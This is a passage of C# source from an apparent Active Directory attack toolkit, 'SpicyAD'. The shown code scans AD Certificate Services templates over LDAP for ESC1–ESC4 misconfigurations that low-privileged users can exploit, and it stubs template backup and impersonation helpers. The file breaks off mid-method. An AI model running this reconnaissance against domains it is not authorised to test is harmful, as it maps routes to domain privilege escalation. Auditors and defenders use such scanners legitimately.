using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using CERTCLILib;

namespace SpicyAD
{
    public static class CertificateOps
    {
        // P/Invoke for LogonUser impersonation (needed for CA requests from non-domain machines)
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword,
            int dwLogonType, int dwLogonProvider, out IntPtr phToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        private const int LOGON32_PROVIDER_WINNT50 = 3;

        // Certificate enrollment GUIDs
        private static readonly string GUID_ENROLL = "0e10c968-78fb-11d2-90d4-00c04f79dc55";
        private static readonly string GUID_AUTOENROLL = "a05b8cc2-17bc-4802-a710-e7c15ab866a2";

        // Well-known SIDs for low-privileged groups
        private static readonly string SID_AUTHENTICATED_USERS = "S-1-5-11";
        private static readonly string SID_EVERYONE = "S-1-1-0";
        private static readonly string SID_DOMAIN_USERS_RID = "-513";
        private static readonly string SID_DOMAIN_COMPUTERS_RID = "-515";

        // Dangerous property GUIDs for ESC4 (properties that enable ESC1 when modified)
        // msPKI-Certificate-Name-Flag - controls ENROLLEE_SUPPLIES_SUBJECT
        private static readonly Guid GUID_MSPKI_CERT_NAME_FLAG = new Guid("ea1dddc4-60ff-416e-8cc0-17cee534bce7");
        // msPKI-Enrollment-Flag - controls enrollment behavior
        private static readonly Guid GUID_MSPKI_ENROLLMENT_FLAG = new Guid("d15ef7d8-f226-46db-ae79-b34e560bd12c");
        // pKIExtendedKeyUsage - controls EKUs (Client Auth, etc.)
        private static readonly Guid GUID_PKI_EXTENDED_KEY_USAGE = new Guid("18976af6-3b9e-11d2-90cc-00c04fd91ab1");
        // msPKI-RA-Signature - controls required signatures
        private static readonly Guid GUID_MSPKI_RA_SIGNATURE = new Guid("d48a2d5e-3cb1-4a8f-a87f-d58ce0c6c03e");
        // msPKI-Certificate-Application-Policy - controls application policies
        private static readonly Guid GUID_MSPKI_CERT_APP_POLICY = new Guid("dbd90548-aa37-4571-8390-59ee61c87fb6");

        // Certificate Name Flags
        private const uint CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001;

        // EKU OIDs
        private const string OID_CLIENT_AUTH = "1.3.6.1.5.5.7.3.2";

        
        /// Class to store template backup configuration
        private class TemplateBackup
        {
            public string TemplateName { get; set; }
            public string TemplateDN { get; set; }
            public DateTime BackupTime { get; set; }
            public int? CertificateNameFlag { get; set; }
            public int? EnrollmentFlag { get; set; }
            public List<string> ExtendedKeyUsage { get; set; }
            public List<string> CertificateApplicationPolicy { get; set; }
            public string SecurityDescriptorBase64 { get; set; }
            public int? RASignature { get; set; }

            public string ToJson()
            {
                var sb = new StringBuilder();
                sb.AppendLine("{");
                sb.AppendLine($"  \"TemplateName\": \"{EscapeJson(TemplateName)}\",");
                sb.AppendLine($"  \"TemplateDN\": \"{EscapeJson(TemplateDN)}\",");
                sb.AppendLine($"  \"BackupTime\": \"{BackupTime:O}\",");
                sb.AppendLine($"  \"CertificateNameFlag\": {(CertificateNameFlag.HasValue ? CertificateNameFlag.Value.ToString() : "null")},");
                sb.AppendLine($"  \"EnrollmentFlag\": {(EnrollmentFlag.HasValue ? EnrollmentFlag.Value.ToString() : "null")},");
                sb.AppendLine($"  \"RASignature\": {(RASignature.HasValue ? RASignature.Value.ToString() : "null")},");
                sb.AppendLine($"  \"SecurityDescriptorBase64\": \"{EscapeJson(SecurityDescriptorBase64 ?? "")}\",");

                // ExtendedKeyUsage array
                sb.Append("  \"ExtendedKeyUsage\": [");
                if (ExtendedKeyUsage != null && ExtendedKeyUsage.Count > 0)
                {
                    sb.Append(string.Join(", ", ExtendedKeyUsage.Select(e => $"\"{EscapeJson(e)}\"")));
                }
                sb.AppendLine("],");

                // CertificateApplicationPolicy array
                sb.Append("  \"CertificateApplicationPolicy\": [");
                if (CertificateApplicationPolicy != null && CertificateApplicationPolicy.Count > 0)
                {
                    sb.Append(string.Join(", ", CertificateApplicationPolicy.Select(e => $"\"{EscapeJson(e)}\"")));
                }
                sb.AppendLine("]");

                sb.AppendLine("}");
                return sb.ToString();
            }

            private static string EscapeJson(string s)
            {
                if (string.IsNullOrEmpty(s)) return "";
                return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
            }

            public static TemplateBackup FromJson(string json)
            {
                var backup = new TemplateBackup();
                backup.ExtendedKeyUsage = new List<string>();
                backup.CertificateApplicationPolicy = new List<string>();

                // Simple JSON parser for our specific format
                backup.TemplateName = ExtractStringValue(json, "TemplateName");
                backup.TemplateDN = ExtractStringValue(json, "TemplateDN");
                backup.SecurityDescriptorBase64 = ExtractStringValue(json, "SecurityDescriptorBase64");

                string backupTimeStr = ExtractStringValue(json, "BackupTime");
                if (!string.IsNullOrEmpty(backupTimeStr))
                {
                    DateTime.TryParse(backupTimeStr, out DateTime dt);
                    backup.BackupTime = dt;
                }

                int? certNameFlag = ExtractIntValue(json, "CertificateNameFlag");
                backup.CertificateNameFlag = certNameFlag;

                int? enrollFlag = ExtractIntValue(json, "EnrollmentFlag");
                backup.EnrollmentFlag = enrollFlag;

                int? raSig = ExtractIntValue(json, "RASignature");
                backup.RASignature = raSig;

                // Parse arrays
                backup.ExtendedKeyUsage = ExtractArrayValues(json, "ExtendedKeyUsage");
                backup.CertificateApplicationPolicy = ExtractArrayValues(json, "CertificateApplicationPolicy");

                return backup;
            }

            private static string ExtractStringValue(string json, string key)
            {
                int keyIndex = json.IndexOf($"\"{key}\"");
                if (keyIndex < 0) return null;

                int colonIndex = json.IndexOf(':', keyIndex);
                if (colonIndex < 0) return null;

                int startQuote = json.IndexOf('"', colonIndex);
                if (startQuote < 0) return null;

                int endQuote = json.IndexOf('"', startQuote + 1);
                while (endQuote > 0 && json[endQuote - 1] == '\\')
                {
                    endQuote = json.IndexOf('"', endQuote + 1);
                }

                if (endQuote < 0) return null;

                string value = json.Substring(startQuote + 1, endQuote - startQuote - 1);
                return value.Replace("\\\"", "\"").Replace("\\\\", "\\").Replace("\\n", "\n").Replace("\\r", "\r");
            }

            private static int? ExtractIntValue(string json, string key)
            {
                int keyIndex = json.IndexOf($"\"{key}\"");
                if (keyIndex < 0) return null;

                int colonIndex = json.IndexOf(':', keyIndex);
                if (colonIndex < 0) return null;

                // Skip whitespace
                int valueStart = colonIndex + 1;
                while (valueStart < json.Length && char.IsWhiteSpace(json[valueStart]))
                    valueStart++;

                if (valueStart >= json.Length) return null;

                // Check for null
                if (json.Substring(valueStart, Math.Min(4, json.Length - valueStart)).StartsWith("null"))
                    return null;

                // Extract number
                int valueEnd = valueStart;
                while (valueEnd < json.Length && (char.IsDigit(json[valueEnd]) || json[valueEnd] == '-'))
                    valueEnd++;

                string numStr = json.Substring(valueStart, valueEnd - valueStart);
                if (int.TryParse(numStr, out int result))
                    return result;

                return null;
            }

            private static List<string> ExtractArrayValues(string json, string key)
            {
                var result = new List<string>();
                int keyIndex = json.IndexOf($"\"{key}\"");
                if (keyIndex < 0) return result;

                int bracketStart = json.IndexOf('[', keyIndex);
                if (bracketStart < 0) return result;

                int bracketEnd = json.IndexOf(']', bracketStart);
                if (bracketEnd < 0) return result;

                string arrayContent = json.Substring(bracketStart + 1, bracketEnd - bracketStart - 1);

                // Extract quoted values
                int pos = 0;
                while (pos < arrayContent.Length)
                {
                    int quoteStart = arrayContent.IndexOf('"', pos);
                    if (quoteStart < 0) break;

                    int quoteEnd = arrayContent.IndexOf('"', quoteStart + 1);
                    while (quoteEnd > 0 && quoteEnd > 0 && arrayContent[quoteEnd - 1] == '\\')
                    {
                        quoteEnd = arrayContent.IndexOf('"', quoteEnd + 1);
                    }

                    if (quoteEnd < 0) break;

                    string value = arrayContent.Substring(quoteStart + 1, quoteEnd - quoteStart - 1);
                    result.Add(value.Replace("\\\"", "\"").Replace("\\\\", "\\"));

                    pos = quoteEnd + 1;
                }

                return result;
            }
        }

        
        /// Enumerate ALL certificate templates with detailed info (like Certify find)
        /// Shows vulnerability status for each template
        public static void EnumerateAllCertificates(string outputFile = null)
        {
            StringBuilder outputBuilder = null;
            bool saveToFile = !string.IsNullOrEmpty(outputFile);

            if (saveToFile)
            {
                outputBuilder = new StringBuilder();
                Console.WriteLine($"[*] Output will be saved to: {outputFile}\n");
            }

            Action<string> writeLine = (text) =>
            {
                Console.WriteLine(text);
                if (saveToFile) outputBuilder.AppendLine(text);
            };

            Action<string, ConsoleColor> writeLineColor = (text, color) =>
            {
                Console.ForegroundColor = color;
                Console.WriteLine(text);
                Console.ResetColor();
                if (saveToFile) outputBuilder.AppendLine(text);
            };

            writeLine("[*] Enumerating ALL Certificate Templates (Certify-style output)...\n");

            try
            {
                // Find the Configuration Naming Context
                DirectoryEntry rootDSE = AuthContext.GetRootDSE();
                string configNC = rootDSE.Properties["configurationNamingContext"][0].ToString();
                string defaultNC = rootDSE.Properties["defaultNamingContext"][0].ToString();

                writeLine($"[*] Configuration NC: {configNC}");
                writeLine($"[*] Default NC: {defaultNC}\n");

                // Get CA info first
                writeLine("=== Certificate Authorities ===\n");
                EnumerateCAs(configNC, writeLine);

                // Search for certificate templates
                DirectoryEntry pkiEntry = AuthContext.GetDirectoryEntry($"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,{configNC}");
                DirectorySearcher templateSearcher = new DirectorySearcher(pkiEntry);
                templateSearcher.Filter = "(objectClass=pKICertificateTemplate)";

                // Load all properties
                templateSearcher.PropertiesToLoad.Add("cn");
                templateSearcher.PropertiesToLoad.Add("displayname");
                templateSearcher.PropertiesToLoad.Add("mspki-certificate-name-flag");
                templateSearcher.PropertiesToLoad.Add("mspki-enrollment-flag");
                templateSearcher.PropertiesToLoad.Add("pkiextendedkeyusage");
                templateSearcher.PropertiesToLoad.Add("mspki-certificate-application-policy");
                templateSearcher.PropertiesToLoad.Add("mspki-ra-signature");
                templateSearcher.PropertiesToLoad.Add("ntsecuritydescriptor");
                templateSearcher.PropertiesToLoad.Add("pkidefaultkeyspec");
                templateSearcher.PropertiesToLoad.Add("mspki-template-schema-version");
                templateSearcher.PropertiesToLoad.Add("pkiexpirationperiod");
                templateSearcher.PropertiesToLoad.Add("pkirenewalperiod");
                templateSearcher.PropertiesToLoad.Add("pkimaxissuingdepth");

                templateSearcher.SecurityMasks = SecurityMasks.Dacl | SecurityMasks.Owner;

                SearchResultCollection templates = templateSearcher.FindAll();

                writeLine($"\n=== Certificate Templates ({templates.Count} total) ===\n");

                int vulnerableCount = 0;

                foreach (SearchResult template in templates)
                {
                    string cn = template.Properties["cn"].Count > 0 ?
                        template.Properties["cn"][0].ToString() : "Unknown";
                    string displayName = template.Properties["displayname"].Count > 0 ?
                        template.Properties["displayname"][0].ToString() : cn;

                    // Get security descriptor
                    ActiveDirectorySecurity adSecurity = null;
                    if (template.Properties["ntsecuritydescriptor"].Count > 0)
                    {
                        try
                        {
                            byte[] sdBytes = (byte[])template.Properties["ntsecuritydescriptor"][0];
                            adSecurity = new ActiveDirectorySecurity();
                            adSecurity.SetSecurityDescriptorBinaryForm(sdBytes);
                        }
                        catch { }
                    }

                    // Get permissions for low-priv users
                    var lowPrivEnrollPerms = GetLowPrivEnrollmentPermissions(adSecurity);
                    var lowPrivWritePerms = GetLowPrivWritePermissions(adSecurity);

                    // Check template configuration flags
                    bool noManagerApproval = CheckNoManagerApprovalFromSR(template);
                    bool noRASignature = CheckNoRASignatureFromSR(template);
                    bool enrolleeSuppliesSubject = CheckEnrolleeSuppliesSubjectFromSR(template);
                    bool hasClientAuth = CheckClientAuthEKUFromSR(template);
                    bool hasAnyPurpose = CheckAnyPurposeEKUFromSR(template);
                    bool hasCertRequestAgent = CheckCertRequestAgentEKUFromSR(template);

                    // Check vulnerabilities based on low-priv groups
                    bool lowPrivCanEnroll = lowPrivEnrollPerms.Count > 0;
                    List<string> vulns = new List<string>();

                    // ESC1: Client Auth + ENROLLEE_SUPPLIES_SUBJECT + low-priv can enroll
                    if ((hasClientAuth || hasAnyPurpose) && enrolleeSuppliesSubject && lowPrivCanEnroll && noManagerApproval && noRASignature)
                    {
                        vulns.Add("ESC1");
                    }

                    // ESC2: Any Purpose or No EKU + low-priv can enroll
                    if (hasAnyPurpose && lowPrivCanEnroll && noManagerApproval && noRASignature && !vulns.Contains("ESC1"))
                    {
                        vulns.Add("ESC2");
                    }

                    // ESC3: Certificate Request Agent + low-priv can enroll
                    if (hasCertRequestAgent && lowPrivCanEnroll && noManagerApproval && noRASignature)
                    {
                        vulns.Add("ESC3");
                    }

                    // ESC4: Low-priv has write permissions
                    if (lowPrivWritePerms.Count > 0)
                    {
                        vulns.Add("ESC4");
                    }

                    bool isVulnerable = vulns.Count > 0;
                    if (isVulnerable) vulnerableCount++;

                    // Print template info
                    writeLine("----------------------------------------");
                    if (isVulnerable)
                    {
                        writeLineColor($"Template: {displayName}  [!!! VULNERABLE: {string.Join(", ", vulns)} !!!]", ConsoleColor.Red);
                    }
                    else
                    {
                        writeLine($"Template: {displayName}");
                    }
                    writeLine($"    CN:                          {cn}");

                    // Schema Version
                    int schemaVersion = template.Properties["mspki-template-schema-version"].Count > 0 ?
                        Convert.ToInt32(template.Properties["mspki-template-schema-version"][0]) : 1;
                    writeLine($"    Schema Version:              {schemaVersion}");

                    // EKUs
                    writeLine($"    Extended Key Usages:");
                    if (template.Properties["pkiextendedkeyusage"].Count > 0)
                    {
                        foreach (var eku in template.Properties["pkiextendedkeyusage"])
                        {
                            writeLine($"        {GetEKUFriendlyName(eku.ToString())} ({eku})");
                        }
                    }
                    else
                    {
                        writeLineColor("        <No EKU - Any Purpose>", ConsoleColor.Yellow);
                    }

                    // Flags
                    uint nameFlag = 0;
                    if (template.Properties["mspki-certificate-name-flag"].Count > 0)
                        nameFlag = unchecked((uint)Convert.ToInt32(template.Properties["mspki-certificate-name-flag"][0]));

                    uint enrollFlag = 0;
                    if (template.Properties["mspki-enrollment-flag"].Count > 0)
                        enrollFlag = unchecked((uint)Convert.ToInt32(template.Properties["mspki-enrollment-flag"][0]));

                    writeLine($"    msPKI-Certificate-Name-Flag: 0x{nameFlag:X8}");
                    if (enrolleeSuppliesSubject)
                    {
                        writeLineColor("        [!] ENROLLEE_SUPPLIES_SUBJECT", ConsoleColor.Yellow);
                    }

                    writeLine($"    msPKI-Enrollment-Flag:       0x{enrollFlag:X8}");
                    writeLine($"    Manager Approval Required:   {!noManagerApproval}");

                    int raSignature = template.Properties["mspki-ra-signature"].Count > 0 ?
                        Convert.ToInt32(template.Properties["mspki-ra-signature"][0]) : 0;
                    writeLine($"    Authorized Signatures:       {raSignature}");

                    // Permissions - only show low-priv enrollment permissions
                    writeLine($"    Low-Priv Enrollment Permissions:");
                    if (lowPrivEnrollPerms.Count > 0)
                    {
                        foreach (var perm in lowPrivEnrollPerms)
                        {
                            writeLineColor($"        [!] {perm}", ConsoleColor.Yellow);
                        }
                    }
                    else
                    {
                        writeLine("        (None - only privileged groups can enroll)");
                    }

                    // Write permissions (ESC4) - only low-priv
                    if (lowPrivWritePerms.Count > 0)
                    {
                        writeLine($"    Low-Priv Write Permissions (ESC4):");
                        foreach (var perm in lowPrivWritePerms)
                        {
                            writeLineColor($"        [!!!] {perm}", ConsoleColor.Red);
                        }
                    }

                    // Vulnerability summary
                    if (isVulnerable)
                    {
                        writeLineColor($"    Vulnerabilities:             {string.Join(", ", vulns)}", ConsoleColor.Red);
                    }

                    writeLine("");
                }

                // Summary
                writeLine("\n========================================");
                writeLine("[*] SUMMARY");
                writeLine("========================================");
                writeLine($"    Total templates:        {templates.Count}");
                writeLineColor($"    Vulnerable templates:   {vulnerableCount}", vulnerableCount > 0 ? ConsoleColor.Red : ConsoleColor.Green);
                writeLine("\n    NOTE: Vulnerabilities shown are exploitable by:");
                writeLine("          - Domain Users");
                writeLine("          - Authenticated Users");
                writeLine("          - Domain Computers");
                writeLine("          - Everyone");

                // Save to file if specified
                if (saveToFile && outputBuilder != null)
                {
                    try
                    {
                        File.WriteAllText(outputFile, outputBuilder.ToString());
                        Console.WriteLine($"\n[+] Output saved to: {outputFile}");
                    }
                    catch (Exception fileEx)
                    {
                        Console.WriteLine($"\n[!] Error saving to file: {fileEx.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                OutputHelper.Verbose($"[!] Stack Trace: {ex.StackTrace}");
            }
        }

        
        /// Get friendly name for EKU OID
        private static string GetEKUFriendlyName(string oid)
        {
            switch (oid)
            {
                case "1.3.6.1.5.5.7.3.1": return "Server Authentication";
                case "1.3.6.1.5.5.7.3.2": return "Client Authentication";
                case "1.3.6.1.5.5.7.3.3": return "Code Signing";
                case "1.3.6.1.5.5.7.3.4": return "Email Protection";
                case "1.3.6.1.5.5.7.3.5": return "IPSec End System";
                case "1.3.6.1.5.5.7.3.6": return "IPSec Tunnel";
                case "1.3.6.1.5.5.7.3.7": return "IPSec User";
                case "1.3.6.1.5.5.7.3.8": return "Timestamping";
                case "1.3.6.1.5.5.7.3.9": return "OCSP Signing";
                case "1.3.6.1.4.1.311.10.3.1": return "Microsoft Trust List Signing";
                case "1.3.6.1.4.1.311.10.3.4": return "Encrypted File System";
                case "1.3.6.1.4.1.311.20.2.1": return "Certificate Request Agent";
                case "1.3.6.1.4.1.311.20.2.2": return "Smart Card Logon";
                case "1.3.6.1.5.2.3.4": return "PKINIT Client Auth";
                case "2.5.29.37.0": return "Any Purpose";
                case "1.3.6.1.4.1.311.21.5": return "CA Exchange";
                case "1.3.6.1.4.1.311.21.6": return "Key Recovery Agent";
                case "1.3.6.1.4.1.311.10.3.12": return "Document Signing";
                default: return "Unknown";
            }
        }

        
        /// Enumerate Certificate Authorities
        private static void EnumerateCAs(string configNC, Action<string> writeLine = null)
        {
            // Use Console.WriteLine as default if no writer provided
            if (writeLine == null) writeLine = Console.WriteLine;

            try
            {
                DirectoryEntry pkiEntry = AuthContext.GetDirectoryEntry($"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,{configNC}");
                DirectorySearcher caSearcher = new DirectorySearcher(pkiEntry);
                caSearcher.Filter = "(objectClass=pKIEnrollmentService)";
                caSearcher.PropertiesToLoad.Add("cn");
                caSearcher.PropertiesToLoad.Add("dNSHostName");
                caSearcher.PropertiesToLoad.Add("certificateTemplates");

                SearchResultCollection cas = caSearcher.FindAll();

                foreach (SearchResult ca in cas)
                {
                    string caName = ca.Properties["cn"].Count > 0 ? ca.Properties["cn"][0].ToString() : "Unknown";
                    string dnsHostName = ca.Properties["dNSHostName"].Count > 0 ? ca.Properties["dNSHostName"][0].ToString() : "N/A";

                    writeLine($"  CA Name:     {caName}");
                    writeLine($"  DNS Host:    {dnsHostName}");
                    writeLine($"  Config:      {dnsHostName}\\{caName}");

                    // List enabled templates
                    if (ca.Properties["certificateTemplates"].Count > 0)
                    {
                        writeLine($"  Templates:   {ca.Properties["certificateTemplates"].Count} enabled");
                        OutputHelper.Verbose("    Enabled templates:");
                        foreach (var tmpl in ca.Properties["certificateTemplates"])
                        {
                            OutputHelper.Verbose($"      - {tmpl}");
                        }
                    }
                    writeLine("");
                }

                if (cas.Count == 0)
                {
                    writeLine("  No Certificate Authorities found.\n");
                }
            }
            catch (Exception ex)
            {
                writeLine($"  [!] Error enumerating CAs: {ex.Message}\n");
            }
        }

        public static void EnumerateVulnerableCertificates()
        {
            Console.WriteLine("[*] Enumerating Certificate Templates for Vulnerabilities...\n");
            Console.WriteLine("[*] Checking ESC1, ESC2, ESC3, ESC4, and ESC8...\n");
            Console.WriteLine("[*] NOTE: Only showing vulnerabilities exploitable by low-privileged groups\n");
            Console.WriteLine("          (Domain Users, Authenticated Users, Domain Computers, Everyone)\n");

            try
            {
                // Find the Configuration Naming Context
                DirectoryEntry rootDSE = AuthContext.GetRootDSE();
                string configNC = rootDSE.Properties["configurationNamingContext"][0].ToString();

                Console.WriteLine($"[*] Configuration NC: {configNC}\n");

                // Search for certificate templates - like Certify does
                DirectoryEntry pkiEntry = AuthContext.GetDirectoryEntry($"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,{configNC}");
                DirectorySearcher templateSearcher = new DirectorySearcher(pkiEntry);
                templateSearcher.Filter = "(objectClass=pKICertificateTemplate)";

                // Load all properties we need
                templateSearcher.PropertiesToLoad.Add("cn");
                templateSearcher.PropertiesToLoad.Add("displayname");
                templateSearcher.PropertiesToLoad.Add("mspki-certificate-name-flag");
                templateSearcher.PropertiesToLoad.Add("mspki-enrollment-flag");
                templateSearcher.PropertiesToLoad.Add("pkiextendedkeyusage");
                templateSearcher.PropertiesToLoad.Add("mspki-certificate-application-policy");
                templateSearcher.PropertiesToLoad.Add("mspki-ra-signature");
                templateSearcher.PropertiesToLoad.Add("ntsecuritydescriptor");

                // IMPORTANT: Set security masks to get the security descriptor
                templateSearcher.SecurityMasks = SecurityMasks.Dacl | SecurityMasks.Owner;

                SearchResultCollection templates = templateSearcher.FindAll();

                Console.WriteLine($"[*] Found {templates.Count} certificate templates\n");

                int esc1Count = 0, esc2Count = 0, esc3Count = 0, esc4Count = 0;

                foreach (SearchResult template in templates)
                {
                    string cn = template.Properties["cn"].Count > 0 ?
                        template.Properties["cn"][0].ToString() : "Unknown";
                    string displayName = template.Properties["displayname"].Count > 0 ?
                        template.Properties["displayname"][0].ToString() : cn;

                    // Get security descriptor directly from SearchResult (like Certify)
                    ActiveDirectorySecurity adSecurity = null;
                    if (template.Properties["ntsecuritydescriptor"].Count > 0)
                    {
                        try
                        {
                            byte[] sdBytes = (byte[])template.Properties["ntsecuritydescriptor"][0];
                            adSecurity = new ActiveDirectorySecurity();
                            adSecurity.SetSecurityDescriptorBinaryForm(sdBytes);
                        }
                        catch (Exception ex)
                        {
                            OutputHelper.Verbose($"[!] Error parsing SD for {cn}: {ex.Message}");
                        }
                    }

                    // Get LOW-PRIV enrollment permissions only (Domain Users, Authenticated Users, etc.)
                    var lowPrivEnrollPerms = GetLowPrivEnrollmentPermissions(adSecurity);

                    // Get LOW-PRIV write permissions only (ESC4)
                    var lowPrivWritePerms = GetLowPrivWritePermissions(adSecurity);

                    // Check template configuration flags
                    bool noManagerApproval = CheckNoManagerApprovalFromSR(template);
                    bool noRASignature = CheckNoRASignatureFromSR(template);
                    bool enrolleeSuppliesSubject = CheckEnrolleeSuppliesSubjectFromSR(template);
                    bool hasClientAuth = CheckClientAuthEKUFromSR(template);
                    bool hasAnyPurpose = CheckAnyPurposeEKUFromSR(template);
                    bool hasCertRequestAgent = CheckCertRequestAgentEKUFromSR(template);

                    // Debug output
                    OutputHelper.Verbose($"[DEBUG] {cn}: ClientAuth={hasClientAuth}, SuppliesSubject={enrolleeSuppliesSubject}, " +
                        $"NoApproval={noManagerApproval}, NoRA={noRASignature}, LowPrivEnroll={lowPrivEnrollPerms.Count}, LowPrivWrite={lowPrivWritePerms.Count}");

                    // Check if LOW-PRIV users can enroll
                    bool lowPrivCanEnroll = lowPrivEnrollPerms.Count > 0;

                    List<string> vulns = new List<string>();

                    // ESC1: Client Auth EKU + ENROLLEE_SUPPLIES_SUBJECT + low-priv can Enroll + No approval + No RA sig
                    if ((hasClientAuth || hasAnyPurpose) && enrolleeSuppliesSubject && lowPrivCanEnroll && noManagerApproval && noRASignature)
                    {
                        vulns.Add("ESC1");
                        esc1Count++;
                    }

                    // ESC2: Any Purpose EKU (or no EKU) + low-priv can Enroll + No approval + No RA sig
                    if (hasAnyPurpose && lowPrivCanEnroll && noManagerApproval && noRASignature && !vulns.Contains("ESC1"))
                    {
                        vulns.Add("ESC2");
                        esc2Count++;
                    }

                    // ESC3: Certificate Request Agent + low-priv can Enroll + No approval + No RA sig
                    if (hasCertRequestAgent && lowPrivCanEnroll && noManagerApproval && noRASignature)
                    {
                        vulns.Add("ESC3");
                        esc3Count++;
                    }

                    // ESC4: Low-priv has write permissions on template
                    if (lowPrivWritePerms.Count > 0)
                    {
                        vulns.Add("ESC4");
                        esc4Count++;
                    }

                    if (vulns.Count > 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"[!] VULNERABLE: {displayName} ({cn})");
                        Console.ResetColor();

                        foreach (var vuln in vulns)
                        {
                            switch (vuln)
                            {
                                case "ESC1":
                                    Console.WriteLine("    [ESC1] Client Auth + ENROLLEE_SUPPLIES_SUBJECT");
                                    Console.WriteLine("           Can request certificate for any user!");
                                    break;
                                case "ESC2":
                                    Console.WriteLine("    [ESC2] Any Purpose EKU (or no EKU)");
                                    Console.WriteLine("           Certificate can be used for any purpose!");
                                    break;
                                case "ESC3":
                                    Console.WriteLine("    [ESC3] Certificate Request Agent EKU");
                                    Console.WriteLine("           Can request certs on behalf of other users!");
                                    break;
                                case "ESC4":
                                    Console.WriteLine("    [ESC4] Template Hijacking - Write permissions");
                                    Console.WriteLine("           Template can be modified!");
                                    break;
                            }
                        }

                        // Show who can enroll (low-priv only)
                        if (lowPrivEnrollPerms.Count > 0)
                        {
                            Console.WriteLine("    Low-Priv Enrollment Permissions:");
                            foreach (var perm in lowPrivEnrollPerms.Take(10))
                            {
                                Console.WriteLine($"        - {perm}");
                            }
                            if (lowPrivEnrollPerms.Count > 10)
                                Console.WriteLine($"        ... and {lowPrivEnrollPerms.Count - 10} more");
                        }

                        // Show who can write (for ESC4) - low-priv only
                        if (vulns.Contains("ESC4") && lowPrivWritePerms.Count > 0)
                        {
                            Console.WriteLine("    Low-Priv Write Permissions:");
                            foreach (var perm in lowPrivWritePerms.Take(10))
                            {
                                Console.WriteLine($"        - {perm}");
                            }
                            if (lowPrivWritePerms.Count > 10)
                                Console.WriteLine($"        ... and {lowPrivWritePerms.Count - 10} more");
                        }

                        Console.WriteLine($"    Manager Approval: {!noManagerApproval}, RA Signature: {!noRASignature}");
                        Console.WriteLine();
                    }
                }

                // Check ESC8 - Web Enrollment
                Console.WriteLine("\n[*] Checking for ESC8 (Web Enrollment)...\n");
                CheckESC8WebEnrollment(configNC);

                // Summary
                Console.WriteLine("\n========================================");
                Console.WriteLine("[*] SUMMARY");
                Console.WriteLine("========================================");
                Console.WriteLine($"    Total templates scanned: {templates.Count}");
                Console.WriteLine($"    ESC1 (Supply Subject):   {esc1Count}");
                Console.WriteLine($"    ESC2 (Any Purpose):      {esc2Count}");
                Console.WriteLine($"    ESC3 (Request Agent):    {esc3Count}");
                Console.WriteLine($"    ESC4 (Template Hijack):  {esc4Count}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                OutputHelper.Verbose($"[!] Stack Trace: {ex.StackTrace}");
            }
        }

        // New methods that work directly with SearchResult (like Certify)
        private static bool CheckEnrolleeSuppliesSubjectFromSR(SearchResult sr)
        {
            try
            {
                if (sr.Properties["mspki-certificate-name-flag"].Count > 0)
                {
                    // Parse as uint to handle large values
                    uint nameFlag = unchecked((uint)Convert.ToInt32(sr.Properties["mspki-certificate-name-flag"][0]));
                    // CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
                    return (nameFlag & 0x00000001) != 0;
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckNoManagerApprovalFromSR(SearchResult sr)
        {
            try
            {
                if (sr.Properties["mspki-enrollment-flag"].Count > 0)
                {
                    uint enrollFlag = unchecked((uint)Convert.ToInt32(sr.Properties["mspki-enrollment-flag"][0]));
                    // CT_FLAG_PEND_ALL_REQUESTS = 0x00000002
                    return (enrollFlag & 0x00000002) == 0;
                }
                return true;
            }
            catch { return true; }
        }

        private static bool CheckNoRASignatureFromSR(SearchResult sr)
        {
            try
            {
                if (sr.Properties["mspki-ra-signature"].Count > 0)
                {
                    int raSignature = Convert.ToInt32(sr.Properties["mspki-ra-signature"][0]);
                    return raSignature == 0;
                }
                return true;
            }
            catch { return true; }
        }

        private static bool CheckClientAuthEKUFromSR(SearchResult sr)
        {
            try
            {
                // Check pkiextendedkeyusage
                if (sr.Properties["pkiextendedkeyusage"].Count > 0)
                {
                    foreach (var eku in sr.Properties["pkiextendedkeyusage"])
                    {
                        string ekuStr = eku.ToString();
                        // Client Authentication: 1.3.6.1.5.5.7.3.2
                        // Smart Card Logon: 1.3.6.1.4.1.311.20.2.2
                        // PKINIT Client Auth: 1.3.6.1.5.2.3.4
                        if (ekuStr == "1.3.6.1.5.5.7.3.2" ||
                            ekuStr == "1.3.6.1.4.1.311.20.2.2" ||
                            ekuStr == "1.3.6.1.5.2.3.4")
                        {
                            return true;
                        }
                    }
                }

                // Check mspki-certificate-application-policy
                if (sr.Properties["mspki-certificate-application-policy"].Count > 0)
                {
                    foreach (var policy in sr.Properties["mspki-certificate-application-policy"])
                    {
                        string policyStr = policy.ToString();
                        if (policyStr == "1.3.6.1.5.5.7.3.2" ||
                            policyStr == "1.3.6.1.4.1.311.20.2.2" ||
                            policyStr == "1.3.6.1.5.2.3.4")
                        {
                            return true;
                        }
                    }
                }

                return false;
            }
            catch { return false; }
        }

        private static bool CheckAnyPurposeEKUFromSR(SearchResult sr)
        {
            try
            {
                // No EKU = Any Purpose (very dangerous!)
                if (sr.Properties["pkiextendedkeyusage"].Count == 0)
                    return true;

                // Explicit Any Purpose EKU
                foreach (var eku in sr.Properties["pkiextendedkeyusage"])
                {
                    if (eku.ToString() == "2.5.29.37.0")
                        return true;
                }

                return false;
            }
            catch { return false; }
        }

        private static bool CheckCertRequestAgentEKUFromSR(SearchResult sr)
        {
            try
            {
